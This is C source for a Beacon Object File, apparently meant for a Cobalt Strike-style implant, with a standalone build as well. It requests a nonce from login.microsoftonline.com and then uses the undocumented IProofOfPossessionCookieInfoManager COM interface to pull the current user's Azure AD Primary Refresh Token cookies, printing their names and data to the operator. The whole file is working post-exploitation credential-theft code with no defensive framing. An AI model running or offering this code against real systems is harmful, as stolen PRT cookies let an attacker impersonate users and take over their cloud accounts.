#include <windows.h>
#include <stdio.h>
#include <winhttp.h>

#ifdef BOF
#define DYNAMIC_LIB_COUNT 3
#include "../common/beacon.h"
#include "../common/bofdefs.h"
#include "../common/base.c"
#define MSVCRT$wcscpy ((wchar_t* (*)(wchar_t*, const wchar_t*))DynamicLoad("MSVCRT", "wcscpy"))
#define MSVCRT$wcslen ((size_t (*)(const wchar_t*))DynamicLoad("MSVCRT", "wcslen"))
#define MSVCRT$strstr ((char* (*)(const char*, const char*))DynamicLoad("MSVCRT", "strstr"))
#define KERNEL32$MultiByteToWideChar ((int (*)(UINT, DWORD, LPCCH, int, LPWSTR, int))DynamicLoad("KERNEL32", "MultiByteToWideChar"))
#define OLE32$CoInitializeEx ((HRESULT (*)(LPVOID, DWORD))DynamicLoad("OLE32", "CoInitializeEx"))
#define OLE32$CoUninitialize ((void (*)(void))DynamicLoad("OLE32", "CoUninitialize"))
#define OLE32$CLSIDFromString ((HRESULT (*)(LPCOLESTR, LPCLSID))DynamicLoad("OLE32", "CLSIDFromString"))
#define OLE32$IIDFromString ((HRESULT (*)(LPCOLESTR, LPIID))DynamicLoad("OLE32", "IIDFromString"))
#define OLE32$CoCreateInstance ((HRESULT (*)(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*))DynamicLoad("OLE32", "CoCreateInstance"))
#define OLE32$CoTaskMemFree ((void (*)(LPVOID))DynamicLoad("OLE32", "CoTaskMemFree"))
#else
#define BeaconPrintf(x, y, ...) printf(y, ##__VA_ARGS__)
#define internal_printf(y, ...) printf(y, ##__VA_ARGS__)
#define CALLBACK_ERROR 0
#define CALLBACK_OUTPUT 0
#define MSVCRT$strstr strstr
#define MSVCRT$wcscpy wcscpy
#define MSVCRT$wcslen wcslen
#define KERNEL32$MultiByteToWideChar MultiByteToWideChar
#define OLE32$CoInitializeEx CoInitializeEx
#define OLE32$CoUninitialize CoUninitialize
#define OLE32$CLSIDFromString CLSIDFromString
#define OLE32$IIDFromString IIDFromString
#define OLE32$CoCreateInstance CoCreateInstance
#define OLE32$CoTaskMemFree CoTaskMemFree
#define WINHTTP$WinHttpOpen WinHttpOpen
#define WINHTTP$WinHttpConnect WinHttpConnect
#define WINHTTP$WinHttpOpenRequest WinHttpOpenRequest
#define WINHTTP$WinHttpSendRequest WinHttpSendRequest
#define WINHTTP$WinHttpReceiveResponse WinHttpReceiveResponse
#define WINHTTP$WinHttpCloseHandle WinHttpCloseHandle
#define WINHTTP$WinHttpQueryDataAvailable WinHttpQueryDataAvailable
#define WINHTTP$WinHttpReadData WinHttpReadData
#define WINHTTP$WinHttpAddRequestHeaders WinHttpAddRequestHeaders

void* intAlloc(size_t size) { return malloc(size); }
void intFree(void* addr) { free(addr); }
#endif

typedef struct ProofOfPossessionCookieInfo {
    LPWSTR name;
    LPWSTR data;
    DWORD flags;
    LPWSTR p3pHeader;
} ProofOfPossessionCookieInfo;

typedef interface IProofOfPossessionCookieInfoManager IProofOfPossessionCookieInfoManager;

typedef struct IProofOfPossessionCookieInfoManagerVtbl {
    BEGIN_INTERFACE
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(
        IProofOfPossessionCookieInfoManager* This,
        REFIID riid,
        void **ppvObject);
    ULONG (STDMETHODCALLTYPE *AddRef)(IProofOfPossessionCookieInfoManager* This);
    ULONG (STDMETHODCALLTYPE *Release)(IProofOfPossessionCookieInfoManager* This);
    HRESULT (STDMETHODCALLTYPE *GetCookieInfoForUri)(
        IProofOfPossessionCookieInfoManager* This,
        LPCWSTR uri,
        DWORD *cookieInfoCount,
        ProofOfPossessionCookieInfo **cookieInfo);
    END_INTERFACE
} IProofOfPossessionCookieInfoManagerVtbl;

interface IProofOfPossessionCookieInfoManager {
    CONST_VTBL struct IProofOfPossessionCookieInfoManagerVtbl *lpVtbl;
};

static wchar_t g_nonce[256] = {0};

BOOL GetAADNonce() {
    BOOL success = FALSE;
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    
    hSession = WINHTTP$WinHttpOpen(
        L"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; Win64; x64; Trident/7.0; .NET4.0C; .NET4.0E)",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);
    
    if (!hSession) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to initialize WinHTTP session\n");
        return FALSE;
    }

    hConnect = WINHTTP$WinHttpConnect(hSession, L"login.microsoftonline.com", 
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to connect to login.microsoftonline.com\n");
        goto cleanup;
    }

    hRequest = WINHTTP$WinHttpOpenRequest(hConnect, L"GET", 
        L"/Common/oauth2/authorize?resource=https://graph.windows.net&client_id=1b730954-1685-4b74-9bfd-dac224a7b894&response_type=code&haschrome=1&redirect_uri=https://login.microsoftonline.com/common/oauth2/nativeclient",
        NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create HTTP request\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpAddRequestHeaders(hRequest, L"UA-CPU: AMD64", -1L, WINHTTP_ADDREQ_FLAG_ADD)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to add request headers\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to send HTTP request\n");
        goto cleanup;
    }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to receive HTTP response\n");
        goto cleanup;
    }

    #define MAX_BUFFER_SIZE 50000  // avg response was 39kb... fix this mess if you feel like it :)

    char* fullBuffer = NULL;
    DWORD totalRead = 0;

    for (;;) {
        DWORD dwAvailable = 0;
        if (!WINHTTP$WinHttpQueryDataAvailable(hRequest, &dwAvailable)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpQueryDataAvailable failed\n");
            break;
        }
        
        if (dwAvailable == 0) break;
        if (totalRead + dwAvailable > MAX_BUFFER_SIZE) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Response too large\n");
            break;
        }

        char* newBuffer = (char*)intAlloc(totalRead + dwAvailable + 1);
        if (!newBuffer) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
            break;
        }

        if (fullBuffer) {
            memcpy(newBuffer, fullBuffer, totalRead);
            intFree(fullBuffer);
        }
        fullBuffer = newBuffer;

        DWORD dwRead = 0;
        if (!WINHTTP$WinHttpReadData(hRequest, fullBuffer + totalRead, dwAvailable, &dwRead)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] WinHttpReadData failed\n");
            break;
        }

        totalRead += dwRead;
        fullBuffer[totalRead] = '\0';
    }
    internal_printf("[+] Response size: %lu\n", totalRead);

    if (fullBuffer && totalRead > 0) {
        char* configStart = MSVCRT$strstr(fullBuffer, "$Config=");
        if (configStart) {
            char* nonceStart = MSVCRT$strstr(configStart, "nonce\":\"");
            if (nonceStart) {
                nonceStart += 8;
                char* nonceEnd = MSVCRT$strstr(nonceStart, "\"");
                if (nonceEnd) {
                    *nonceEnd = '\0';
                    KERNEL32$MultiByteToWideChar(CP_UTF8, 0, nonceStart, -1, g_nonce, 256);
                    success = TRUE;
                }
            }
        }
    }

    if (fullBuffer) {
        intFree(fullBuffer);
    }

cleanup:
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    return success;
}

BOOL RequestAADPRT(const wchar_t* nonce) {
    HRESULT hr = S_OK;
    DWORD cookieCount = 0;
    ProofOfPossessionCookieInfo* cookies = NULL;
    IProofOfPossessionCookieInfoManager* popCookieManager = NULL;
    GUID CLSID_ProofOfPossessionCookieInfoManager;
    GUID IID_IProofOfPossessionCookieInfoManager;
    wchar_t uri[1024] = {0};
    BOOL success = FALSE;

    internal_printf("[+] Starting PRT request with nonce\n");

    swprintf_s(uri, 1024, L"https://login.microsoftonline.com/common/oauth2/authorize?sso_nonce=%s", nonce);

    hr = OLE32$CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoInitializeEx failed: 0x%08lx\n", hr);
        return FALSE;
    }

    hr = OLE32$CLSIDFromString(L"{A9927F85-A304-4390-8B23-A75F1C668600}", &CLSID_ProofOfPossessionCookieInfoManager);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CLSIDFromString failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = OLE32$IIDFromString(L"{CDAECE56-4EDF-43DF-B113-88E4556FA1BB}", &IID_IProofOfPossessionCookieInfoManager);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] IIDFromString failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = OLE32$CoCreateInstance(&CLSID_ProofOfPossessionCookieInfoManager, 
                               NULL, 
                               CLSCTX_INPROC_SERVER, 
                               &IID_IProofOfPossessionCookieInfoManager, 
                               (void**)&popCookieManager);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] CoCreateInstance failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    hr = popCookieManager->lpVtbl->GetCookieInfoForUri(popCookieManager, uri, &cookieCount, &cookies);
    if (FAILED(hr)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] GetCookieInfoForUri failed: 0x%08lx\n", hr);
        goto cleanup;
    }

    if (cookieCount == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No cookies found\n");
        goto cleanup;
    }

    internal_printf("[+] Found %lu cookies:\n", cookieCount);
    for (DWORD i = 0; i < cookieCount; i++) {
        internal_printf("Cookie %lu:\n", i + 1);
        internal_printf("  Name: %ls\n", cookies[i].name);
        internal_printf("  Data: %ls\n", cookies[i].data);
        internal_printf("  Flags: 0x%x\n", cookies[i].flags);

        if (cookies[i].p3pHeader) {
            internal_printf("  P3PHeader: %ls\n", cookies[i].p3pHeader);
        }
        
        if (cookies[i].name) OLE32$CoTaskMemFree(cookies[i].name);
        if (cookies[i].data) OLE32$CoTaskMemFree(cookies[i].data);
        if (cookies[i].p3pHeader) OLE32$CoTaskMemFree(cookies[i].p3pHeader);
    }
    success = TRUE;

cleanup:
    if (cookies) {
        OLE32$CoTaskMemFree(cookies);
    }
    if (popCookieManager) {
        popCookieManager->lpVtbl->Release(popCookieManager);
    }
    OLE32$CoUninitialize();
    return success;
}

#ifdef BOF
VOID go(char* args, int len) {
    if(!bofstart()) {
        return;
    }

    internal_printf("[+] Starting AAD PRT request process\n");

    if (!GetAADNonce()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve AAD nonce\n");
        return;
    }

    if (g_nonce[0] != L'\0') {
        if (!RequestAADPRT(g_nonce)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to request AAD PRT\n");
            return;
        }
        internal_printf("[+] AAD PRT request completed\n");
    }

    printoutput(TRUE);
    bofstop(); //offload loaded libraries
}
#else
INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    BeaconPrintf(CALLBACK_OUTPUT, "[+] Starting AAD PRT request process\n");

    if (!GetAADNonce()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to retrieve AAD nonce\n");
        return 1;
    }

    if (g_nonce[0] != L'\0') {
        if (!RequestAADPRT(g_nonce)) {
            BeaconPrintf(CALLBACK_ERROR, "[-] Failed to request AAD PRT\n");
            return 1;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] AAD PRT request completed\n");
    }

    return 0;
}
#endif